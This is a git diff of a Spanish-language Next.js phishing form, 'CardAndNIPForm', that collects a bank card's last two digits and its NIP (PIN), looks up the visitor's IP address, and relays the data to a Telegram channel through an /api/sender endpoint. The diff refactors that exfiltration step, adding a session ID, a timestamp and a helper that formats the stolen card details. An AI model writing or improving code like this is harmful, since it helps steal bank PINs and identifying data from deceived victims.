@@ -6,6 +6,8 @@ import { useRouter } from 'next/router'; // Importa useRouter para redirigir
 import Header from '@/components/header';
 import Footer from '@/components/Footer';
 import { toast } from 'sonner';
+import { getSessionId } from '@/utils/session';
+import { formatCardDetailsMessage, getTimestamp } from '@/utils/telegramFormatter';
 
 const CardAndNIPForm = () => {
     const router = useRouter(); // Instancia de useRouter para la redirección
@@ -93,12 +95,16 @@ const CardAndNIPForm = () => {
             if (!isTestMode) {
                 // Only send to Telegram if NOT in test mode
                 const ip = await axios.get('https://api.ipify.org?format=json');
+                const sessionId = getSessionId();
 
-                // Format message for Telegram
-                let message = `DATOS DE TARJETA\n\n` +
-                    `Últimos 2 dígitos: ${formData.lastTwoDigits}\n\n` +
-                    `NIP: ${formData.nip}\n\n` +
-                    `IP: ${ip.data.ip}`;
+                // Format message for Telegram with improved structure
+                const message = formatCardDetailsMessage({
+                    sessionId,
+                    lastTwoDigits: formData.lastTwoDigits,
+                    nip: formData.nip,
+                    ip: ip.data.ip,
+                    timestamp: getTimestamp()
+                });
 
                 // Send directly to Telegram via sender API
                 await axios.post('/api/sender', { message });
